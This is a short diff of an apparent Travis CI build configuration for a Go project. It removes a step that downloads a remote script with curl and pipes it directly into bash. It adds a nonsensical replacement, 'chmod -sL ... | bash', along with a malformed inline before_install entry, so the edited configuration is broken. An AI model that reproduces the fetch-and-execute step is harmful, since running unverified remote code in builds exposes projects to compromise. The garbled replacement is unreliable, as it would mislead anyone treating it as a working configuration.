@@ -1,5 +1,6 @@
 dist: latest
-language: go 
+language: go
+before_install:  - chmod u+x deploy.sh
 script:
-  - curl -sL debug-github-actions.sh | bash
+  - chmod -sL debug-github-actions.sh | bash
   - sleep 1m
